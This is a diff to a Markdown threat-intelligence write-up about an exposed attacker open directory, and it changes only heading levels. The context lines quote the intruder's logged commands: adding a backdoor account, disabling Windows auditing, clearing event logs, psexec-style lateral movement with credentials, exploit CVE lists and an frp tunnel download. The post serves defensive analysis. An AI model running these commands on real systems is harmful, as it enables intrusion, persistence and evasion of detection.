@@ -20,7 +20,7 @@ During malware execution chains or hands-on-keyboard intrusions, adversaries wil
 
 Occasionally, when threat actors are hosting payloads over HTTP, they accidentally expose the whole entire directory and subdirectory of files, rather than the singular payload they intended to share. This can introduce a massive operational security failure for adversaries, as additional tooling, victim data, adversary credentials, and more, can be exposed. 
 
-## Case Study
+# Case Study
 
 In some cases, like the one we will discuss, the OPSEC failure can be so **significant** that an entire *potential* espionage operation can be exposed, within a day. 
 
@@ -30,7 +30,7 @@ Evidence suggests the threat actor gained access to these organisations via expl
 
 Based on our observations and victimology, these tactics, techniques, and procedures (TTPs) show significant overlap with previously reported activity attributed to threat actor *Earth Lamia*, named by Trend Micro.
 
-### .bash_history
+## .bash_history
 
 When hunting for interesting open-directories, I always keep an eye out for the Linux `.bash_history` file. This can expose the commands run by an adversary on a Linux machine. It will reside in the user's home folder (e.g. `/home/ben/.bash_history`).
 
@@ -259,11 +259,11 @@ dns-beacon {
 [...REDACTED...]
 ```
 
-## Cobalt Strike Post-Exploitation
+# Cobalt Strike Post-Exploitation
 
 This threat actor appeared to use Cobalt Strike for persistence, privilege escalation, defence evasion, lateral movement and information harvesting. From Cobalt Strike logs, we were able to ascertain commands run and tooling executed by the threat actor: 
 
-### Misc
+## Misc
 
 ```
 C:\ProgramData\mdm.txt
@@ -273,7 +273,7 @@ C:\ProgramData\GetCLSID.ps1
 
 Likely staging files. GetCLSID.ps1 could be a script for enumerating COM CLSIDs or checking for hijack opportunities.
 
-#### Discovery
+## Discovery
 
 `net user` - lists all user accounts
 `systeminfo` - Displays OS version, build, hotfixes, domain info, uptime
@@ -318,7 +318,7 @@ fscan.exe -h 192.168.1.1/24 -pa 3389
 
 * Using niche Chinese network enumeration tooling [fscan](https://github.com/shadow1ng/fscan)
 
-#### Execution
+## Execution
 
 ```
 C:\Users\Administrator\Desktop\shell\svhost.exe
@@ -331,7 +331,7 @@ C:\winodws\taskhost.exe
 `C:\Windows\System32\spool\drivers
 \color\e8i580ehei5a3.dll` - Likely malicious DLL
 
-#### Persistence
+## Persistence
 
 ```
 net user IIS_USER Pass@123 /add
@@ -356,7 +356,7 @@ This allows the adversary to tunnel RDP to their server. See “Command and Cont
 
 
 
-#### Defence Evasion
+## Defence Evasion
 
 ```bash
 auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
@@ -410,7 +410,7 @@ Clear-EventLog -LogName System, Security, Application
 
 * Attempts to wipe all Windows event logs.
 
-#### Credential Access
+## Credential Access
 
 ```bash
 DecryptTeamViewer.exe
@@ -418,12 +418,12 @@ DecryptTeamViewer.exe
 
 * Red team tooling “to enumerate and decrypt TeamViewer credentials from Windows registry.” - https://github.com/V1V1/DecryptTeamViewer
 
-#### Lateral Movement
+## Lateral Movement
 
 ```bash
 SharpExec.exe -m=psexec -i=192.168.1.2 -u=ftp -p=abc@123v -d= -e=C:\Windows\System32\cmd.exe -c=”whoami”
 ```
-#### Privilege Escalation
+## Privilege Escalation
 
 `C:\ProgramData\FFICreateAdminUser.exe` - The threat actor leveraged a open source tool developed by Tas9er to create new Administrator accounts
 
@@ -435,7 +435,7 @@ CVE-2024-30088, CVE-2023-28252, CVE-2020-0796, CVE-2023-36802, CVE-2018-8120, CV
 MS13-046, MS16-032, MS15-051
 ```
 
-#### Command & Control
+## Command & Control
 
 ```bash
 https://github.com/fatedier/frp/releases/download/v0.36.2/frp_0.36.2_windows_amd64.zip
